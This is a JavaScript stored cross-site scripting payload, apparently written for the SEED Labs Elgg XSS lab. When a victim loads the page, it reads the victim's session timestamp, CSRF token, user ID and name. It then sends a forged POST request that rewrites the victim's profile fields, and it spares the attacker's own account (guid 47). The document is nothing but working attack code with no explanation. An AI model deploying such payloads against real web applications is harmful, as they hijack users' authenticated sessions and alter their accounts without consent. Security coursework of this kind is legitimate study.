<script type="text/javascript">
	function randomString(length) {
	var result = "";
	var characters = "abcdefghijklmnopqrstuvwxyz";
	for (var i = 0; i < length; i++) {
	result += characters.charAt(Math.floor(Math.random() * 26));
	}
	return result;
	}

	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var guid = "&guid=" + elgg.session.user.guid;
	var name = "&name=" + elgg.session.user.name;
	// profile fields (found from edit request params)
	var description = "&description=1605094&accesslevel[description]=1";
	var email = "&contactemail=random@gmail.com&accesslevel[contactemail]=1";
	var website = "&website=www.google.com&accesslevel[website]=1";
	var params = ts + token + guid + name + description + email + website;

	var fields = ["briefdescription", "interests", "location", "mobile", "phone", "skills", "twitter"];

	fields.forEach(function(field) {
	params += "&" + field + "=" + randomString(5);
	params += "&accesslevel[" + field + "]=1"; 
	});

	
	//Construct the content of your url.
        var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=params; 
	
	if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
